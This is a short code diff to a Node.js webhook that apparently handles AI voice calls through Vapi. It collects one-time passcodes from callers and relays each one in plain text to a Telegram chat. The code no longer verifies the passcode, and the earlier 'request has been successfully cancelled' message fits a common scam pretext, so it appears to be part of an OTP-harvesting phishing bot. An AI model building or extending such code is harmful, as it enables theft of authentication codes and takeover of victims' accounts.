@@ -171,34 +171,24 @@ module.exports = async function handler(req, res) {
     }
   }
 
-  // ===== VAPI DTMF HANDLER =====
-  if (body?.dtmf && body.customer && body.customer.number) {
-    const phone = body.customer.number;
-    let digits = body.dtmf;
+  // ===== VAPI TOOL CALL HANDLER (OTP) =====
+if (body?.message?.type === "tool-calls") {
+  const toolCall = body.message.toolCallList?.[0];
+  if (!toolCall) return res.status(200).send("OK");
 
-    const user = await User.findOne({ phone });
-    if (!user) return res.status(200).send("OK");
+  const toolCallId = toolCall.id;
+  const enteredOtp = toolCall.function?.arguments?.otp;
+  const phone = body.message.call?.customer?.number;
 
-    digits = digits.toString().trim();
+  // Find user by phone
+  const user = phone ? await User.findOne({ phone }) : null;
 
-    // Send digits to Telegram for debugging
-    await bot.sendMessage(user.chatId, `🔢 User entered OTP via keypad: ${digits}`);
-
-    if (digits === user.otp) {
-      user.status = "verified";
-      await user.save();
-
-      await bot.sendMessage(
-        user.chatId,
-        "✅ OTP Verified\nYour request has been successfully cancelled."
-      );
-    } else {
-      await bot.sendMessage(
-        user.chatId,
-        "❌ Incorrect OTP entered. Please try again."
-      );
-    }
+  if (user?.chatId) {
+    await bot.sendMessage(user.chatId, `🔢 OTP entered via call: ${enteredOtp}`);
   }
 
-  return res.status(200).send("OK");
-};
+  // IMPORTANT: respond with tool result
+  return res.status(200).json({
+    results: [{ toolCallId, result: "OTP received" }]
+  });
+}
